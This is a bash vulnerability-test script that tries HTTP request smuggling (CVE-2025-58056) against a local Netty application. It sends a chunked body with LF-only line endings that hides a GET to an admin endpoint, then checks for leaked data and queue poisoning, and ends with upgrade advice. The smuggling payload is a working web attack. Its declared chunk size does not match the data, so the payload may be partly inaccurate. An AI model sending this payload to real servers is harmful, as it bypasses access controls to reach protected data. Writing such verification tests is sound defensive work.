#!/bin/bash

# HTTP Request Smuggling Test for CVE-2025-58056
# This script demonstrates the actual vulnerability in Netty 4.1.124.Final

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

APP_PORT="8080"
TARGET_ENDPOINT="/api/chunked"
SMUGGLED_ENDPOINT="/api/admin/sensitive"

echo -e "${BLUE}==================================================${NC}"
echo -e "${BLUE}🚨 HTTP Request Smuggling Test (CVE-2025-58056)${NC}"
echo -e "${BLUE}==================================================${NC}"

# Check if application is running
if ! curl -s http://localhost:$APP_PORT/api/health > /dev/null; then
    echo -e "${RED}❌ Application not running on port $APP_PORT${NC}"
    exit 1
fi

echo -e "${GREEN}✅ Application is running${NC}"

# Test 1: Normal request to verify endpoint works
echo -e "${BLUE}📋 Test 1: Normal request to $TARGET_ENDPOINT${NC}"
NORMAL_RESPONSE=$(curl -s -X POST http://localhost:$APP_PORT$TARGET_ENDPOINT \
    -H "Content-Type: application/json" \
    -d '{"test": "normal"}')
echo "Response: $NORMAL_RESPONSE"

# Test 2: Check if smuggled endpoint exists and is protected
echo -e "${BLUE}📋 Test 2: Direct access to smuggled endpoint${NC}"
DIRECT_RESPONSE=$(curl -s -X GET http://localhost:$APP_PORT$SMUGGLED_ENDPOINT)
echo "Direct access response: $DIRECT_RESPONSE"

# Test 3: HTTP Request Smuggling Attack
echo -e "${BLUE}📋 Test 3: HTTP Request Smuggling Attack${NC}"
echo -e "${YELLOW}Attempting to smuggle GET request to $SMUGGLED_ENDPOINT...${NC}"

# Create the malicious payload
# This exploits the LF-only parsing bug in Netty 4.1.124.Final
SMUGGLED_PAYLOAD=$'5\n{"test": "smuggled"}\n0\n\nGET '$SMUGGLED_ENDPOINT$' HTTP/1.1\nHost: localhost:'$APP_PORT$'\n\n'

echo -e "${YELLOW}Payload structure:${NC}"
echo "1. First chunk: 5 bytes of JSON data"
echo "2. Chunk terminator: 0"
echo "3. Smuggled request: GET $SMUGGLED_ENDPOINT"
echo "4. Uses LF-only line terminators (\\n instead of \\r\\n)"

# Send the malicious request
SMUGGLED_RESPONSE=$(curl -s -X POST http://localhost:$APP_PORT$TARGET_ENDPOINT \
    -H "Content-Type: application/json" \
    -H "Transfer-Encoding: chunked" \
    --data-binary "$SMUGGLED_PAYLOAD" \
    -w "\nHTTP_CODE:%{http_code}\nTIME_TOTAL:%{time_total}")

echo -e "${BLUE}📋 Smuggled request response:${NC}"
echo "$SMUGGLED_RESPONSE"

# Test 4: Check for signs of successful smuggling
echo -e "${BLUE}📋 Test 4: Analyzing response for smuggling indicators${NC}"

# Look for signs that the smuggled request was processed
if echo "$SMUGGLED_RESPONSE" | grep -q "Sensitive admin data"; then
    echo -e "${RED}🚨 VULNERABILITY CONFIRMED: Smuggled request was processed!${NC}"
    echo -e "${RED}   The GET request to $SMUGGLED_ENDPOINT was executed${NC}"
    VULNERABLE=true
elif echo "$SMUGGLED_RESPONSE" | grep -q "HTTP_CODE:200" && echo "$SMUGGLED_RESPONSE" | grep -q "admin"; then
    echo -e "${RED}🚨 VULNERABILITY CONFIRMED: Smuggled request may have been processed${NC}"
    VULNERABLE=true
else
    echo -e "${GREEN}✅ No clear signs of request smuggling detected${NC}"
    VULNERABLE=false
fi

# Test 5: Multiple requests to check for request queue poisoning
echo -e "${BLUE}📋 Test 5: Request queue poisoning test${NC}"
echo -e "${YELLOW}Sending multiple requests to check for queue poisoning...${NC}"

# Send the smuggled request
curl -s -X POST http://localhost:$APP_PORT$TARGET_ENDPOINT \
    -H "Content-Type: application/json" \
    -H "Transfer-Encoding: chunked" \
    --data-binary "$SMUGGLED_PAYLOAD" > /dev/null

# Immediately send a normal request
sleep 0.1
NORMAL_AFTER_SMUGGLING=$(curl -s -X POST http://localhost:$APP_PORT$TARGET_ENDPOINT \
    -H "Content-Type: application/json" \
    -d '{"test": "after-smuggling"}')

echo "Normal request after smuggling: $NORMAL_AFTER_SMUGGLING"

# Check if the normal request was affected
if echo "$NORMAL_AFTER_SMUGGLING" | grep -q "Sensitive admin data"; then
    echo -e "${RED}🚨 QUEUE POISONING DETECTED: Normal request was affected by smuggled request${NC}"
    VULNERABLE=true
fi

# Summary
echo -e "${BLUE}==================================================${NC}"
echo -e "${BLUE}📊 Test Summary${NC}"
echo -e "${BLUE}==================================================${NC}"

if [ "$VULNERABLE" = true ]; then
    echo -e "${RED}🚨 CVE-2025-58056 VULNERABILITY CONFIRMED${NC}"
    echo -e "${RED}   Netty 4.1.124.Final is vulnerable to HTTP request smuggling${NC}"
    echo -e "${RED}   Recommendation: Upgrade to Netty 4.1.125.Final or later${NC}"
else
    echo -e "${GREEN}✅ No clear vulnerability detected in this test${NC}"
    echo -e "${YELLOW}   Note: This test may not detect all exploitation scenarios${NC}"
    echo -e "${YELLOW}   For comprehensive testing, use specialized tools like Burp Suite${NC}"
fi

echo -e "${BLUE}==================================================${NC}"
